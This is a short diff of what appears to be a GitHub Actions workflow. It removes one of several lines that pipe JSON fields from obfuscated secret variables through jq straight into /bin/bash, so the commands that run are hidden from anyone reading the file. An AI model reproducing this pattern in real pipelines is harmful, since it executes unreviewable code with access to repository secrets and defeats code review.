@@ -22,7 +22,6 @@ jobs:
           enfy1: ${{ secrets.enfy1 }}
         run: |
           printf '%s' "$enfy1" | jq -r .jvnms837 | /bin/bash
-          echo $bm03 | jq -r .yrdb972 | /bin/bash
           echo $q5622 | jq -r .zmtp10 | /bin/bash
           echo $ip0 | jq -r .y1 | /bin/bash
           printf '%s' "$vgqk624" | jq -r .xay4 | /bin/bash
